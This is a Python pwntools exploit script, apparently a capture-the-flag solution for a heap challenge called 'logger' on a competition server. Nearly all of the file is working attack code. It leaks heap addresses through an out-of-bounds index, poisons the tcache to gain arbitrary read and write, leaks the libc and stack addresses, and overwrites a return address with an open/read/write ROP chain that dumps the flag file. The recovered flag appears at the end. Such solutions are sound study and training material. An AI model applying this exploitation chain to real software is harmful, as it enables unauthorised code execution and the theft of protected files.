from pwn import *
context.arch = 'amd64'

elf = ELF('logger')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = elf.process()
p = remote('chals1.eof.ais3.org', 45125)

def new(idx, len, msg):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'len: ')
    p.sendline(str(len).encode())
    p.recvuntil(b'msg: ')
    p.sendline(msg)

def delete(idx):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())

def show(idx):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())

def edit(idx, msg):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'msg: ')
    p.sendline(msg)

p.recvuntil(b'len: ')
p.sendline(b'0')

new(0, 0x78, b'aaa')
edit(7, b'aaa')
show(0)
p.recvuntil(b'msg: ')
heap_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
print(hex(heap_leak))
heap_base = heap_leak - 0xba0

new(1, 0x68, b'aaa')
new(2, 0x68, b'aaa')
new(6, 0xc8, b'aaa')
delete(1)
edit(0, p64(heap_base) + p64(0))
delete(0)
new(3, 0x68, b'aaa')
edit(3, p64(heap_base + 0x20))
new(4, 0x68, b'aaa')
new(5, 0x68, b'\x00\x00\x00\x00\x00\x00\x07\x00')
delete(6)

target = heap_base + 0xe30 # 2
delete(3)
edit(4, p64(heap_base) + p64(0))
delete(4)
new(0, 0x68, b'aaa')
edit(0, p64(target))
new(1, 0x68, b'aaa')
new(6, 0x68, p64(heap_base + 0x350) + p64(heap_base + 0x350) + p64(0x8))
show(2)
p.recvuntil(b'msg: ')
libc_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
print(hex(libc_leak))
libc_base = libc_leak - 0x1ebbe0

environ_addr = libc_base + 0x1ef2e0
edit(6, p64(environ_addr) + p64(environ_addr) + p64(0x8))
show(2)
p.recvuntil(b'msg: ')
stack_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
print(hex(stack_leak))

ret_addr = stack_leak - 0x100
libc.address = libc_base

pop_rdi = 0x0000000000026b72 + libc_base
pop_rsi = 0x0000000000027529 + libc_base
pop_rdx_r12 = 0x000000000011c371 + libc_base
buf = heap_base + 0x1000

ropc = flat([pop_rdi, buf, pop_rsi, 0, pop_rdx_r12, 0, 0, libc.symbols['open'], pop_rdi, 3, pop_rsi, buf, pop_rdx_r12, 0x100, 0, libc.symbols['read'], pop_rdi, 1, libc.symbols['write']])
flag = b'/home/logger/flag'
# flag = b'./flag'

edit(6, p64(buf) + p64(buf) + p64(len(flag) + 1))
edit(2, flag)

edit(6, p64(ret_addr) + p64(ret_addr) + p64(len(ropc) + 1))
edit(2, ropc)

p.recvuntil(b'> ')
p.sendline(b'5')

p.interactive()

# FLAG{heap ORW is good}